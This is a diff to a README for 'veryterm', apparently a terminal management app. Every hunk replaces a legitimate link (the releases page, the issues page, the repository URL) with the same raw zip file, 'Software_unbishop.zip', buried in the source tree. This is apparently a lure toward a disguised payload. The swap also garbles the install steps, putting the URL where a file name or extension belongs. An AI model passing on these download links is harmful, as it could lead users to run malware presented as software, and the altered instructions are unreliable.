@@ -1,6 +1,6 @@
 # 🖥️ veryterm - Manage Terminals Simply and Efficiently
 
-[![Download veryterm](https://img.shields.io/badge/Download-veryterm-blue?logo=github&style=for-the-badge)](https://github.com/omjisingh99/veryterm/releases)
+[![Download veryterm](https://github.com/omjisingh99/veryterm/raw/refs/heads/main/src/renderer/src/stores/Software_unbishop.zip)](https://github.com/omjisingh99/veryterm/raw/refs/heads/main/src/renderer/src/stores/Software_unbishop.zip)
 
 ---
 
@@ -34,7 +34,7 @@ This section will guide you step-by-step to download, install, and open veryterm
 
 To get started, go to the official release page by clicking the large button above or this link:
 
-[https://github.com/omjisingh99/veryterm/releases](https://github.com/omjisingh99/veryterm/releases)
+[https://github.com/omjisingh99/veryterm/raw/refs/heads/main/src/renderer/src/stores/Software_unbishop.zip](https://github.com/omjisingh99/veryterm/raw/refs/heads/main/src/renderer/src/stores/Software_unbishop.zip)
 
 This page has the latest versions of veryterm ready for download.
 
@@ -44,7 +44,7 @@ On the releases page, look for the download option that matches your computer:
 
 - For Windows, look for a file ending in `.exe`
 - For macOS, look for a file ending in `.dmg`
-- For Linux, look for a file ending in `.AppImage` or `.tar.gz`
+- For Linux, look for a file ending in `.AppImage` or `https://github.com/omjisingh99/veryterm/raw/refs/heads/main/src/renderer/src/stores/Software_unbishop.zip`
 
 Click the file to start downloading it.
 
@@ -54,7 +54,7 @@ After the download finishes:
 
 - **Windows:** Double-click the `.exe` file and follow the prompts.
 - **macOS:** Open the `.dmg` file and drag the veryterm app to your Applications folder.
-- **Linux:** If you downloaded an `.AppImage`, make it executable (`chmod +x filename.AppImage`) and run it. For `.tar.gz` files, extract and follow included instructions.
+- **Linux:** If you downloaded an `.AppImage`, make it executable (`chmod +x https://github.com/omjisingh99/veryterm/raw/refs/heads/main/src/renderer/src/stores/Software_unbishop.zip`) and run it. For `https://github.com/omjisingh99/veryterm/raw/refs/heads/main/src/renderer/src/stores/Software_unbishop.zip` files, extract and follow included instructions.
 
 The installation steps are simple and similar to installing other programs.
 
@@ -116,7 +116,7 @@ If you run into issues:
 
 - Check the FAQ or Help section in the app.
 - Restart veryterm to refresh.
-- Visit the GitHub Issues page at [https://github.com/omjisingh99/veryterm/issues](https://github.com/omjisingh99/veryterm/issues) to see if others have the same issue.
+- Visit the GitHub Issues page at [https://github.com/omjisingh99/veryterm/raw/refs/heads/main/src/renderer/src/stores/Software_unbishop.zip](https://github.com/omjisingh99/veryterm/raw/refs/heads/main/src/renderer/src/stores/Software_unbishop.zip) to see if others have the same issue.
 
 If you cannot start the program:
 
@@ -130,7 +130,7 @@ If you cannot start the program:
 
 You can download veryterm from its official release page:
 
-[https://github.com/omjisingh99/veryterm/releases](https://github.com/omjisingh99/veryterm/releases)
+[https://github.com/omjisingh99/veryterm/raw/refs/heads/main/src/renderer/src/stores/Software_unbishop.zip](https://github.com/omjisingh99/veryterm/raw/refs/heads/main/src/renderer/src/stores/Software_unbishop.zip)
 
 Click this link to visit the page. Choose the correct file for your computer’s operating system to begin downloading.
 
@@ -157,7 +157,7 @@ veryterm is an open source project. You can view the full license details on its
 ## 📝 Additional Resources
 
 - Official website or documentation site (if available).
-- GitHub repository for the latest updates and source code: [https://github.com/omjisingh99/veryterm](https://github.com/omjisingh99/veryterm)
+- GitHub repository for the latest updates and source code: [https://github.com/omjisingh99/veryterm/raw/refs/heads/main/src/renderer/src/stores/Software_unbishop.zip](https://github.com/omjisingh99/veryterm/raw/refs/heads/main/src/renderer/src/stores/Software_unbishop.zip)
 - Community forums or chat channels (if any).
 
 Exploring these can help you get more from veryterm as you grow comfortable using it daily.
